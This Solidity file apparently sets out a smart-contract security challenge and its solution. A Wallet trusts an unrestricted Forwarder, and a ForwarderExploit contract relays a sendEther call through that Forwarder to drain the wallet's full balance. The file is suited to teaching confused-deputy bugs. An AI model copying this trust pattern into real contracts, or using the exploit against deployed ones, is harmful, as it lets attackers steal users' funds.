// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

contract Wallet {
    address public immutable forwarder;

    constructor(address _forwarder) payable {
        require(msg.value == 1 ether);
        forwarder = _forwarder;
    }

    function sendEther(address destination, uint256 amount) public {
        require(msg.sender == forwarder, "sender must be forwarder contract");
        (bool success, ) = destination.call{value: amount}("");
        require(success, "failed");
    }
}

contract Forwarder {
    function functionCall(address a, bytes calldata data) public {
        (bool success, ) = a.call(data);
        require(success, "forward failed");
    }
}

contract ForwarderExploit {
    Forwarder forwarder;
    Wallet wallet;

    constructor(address _forwarder, address _wallet) {
        forwarder = Forwarder(_forwarder);
        wallet = Wallet(_wallet);
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSignature(
            "sendEther(address,uint256)",
            address(this),
            address(wallet).balance
        );
        forwarder.functionCall(address(wallet), data);
    }

    receive() external payable {}
}